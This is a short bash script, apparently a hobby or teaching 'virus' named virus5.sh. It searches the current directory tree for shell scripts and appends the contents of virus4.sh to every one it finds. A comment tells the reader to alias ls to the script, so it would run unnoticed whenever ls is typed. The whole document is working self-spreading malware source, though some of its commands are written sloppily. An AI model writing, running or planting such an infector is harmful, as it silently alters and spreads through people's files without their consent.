#!/bin/bash
# To alias this script you should add this to your .bashrc
# alias ls="ls; absolute path to this script"

files=`find $PWD -type f -name "*.sh" `
files=($(echo $files | tr " " "\n"))
vir=`pwd virus5.sh`
vir=$vir/virus5.sh

for file in "${files[@]}"; do
    if [[ $file != `pwd virus4.sh`/virus4.sh && $file != $vir ]]; then
        echo >> $file
        cat virus4.sh >> $file
    fi
done

exit 0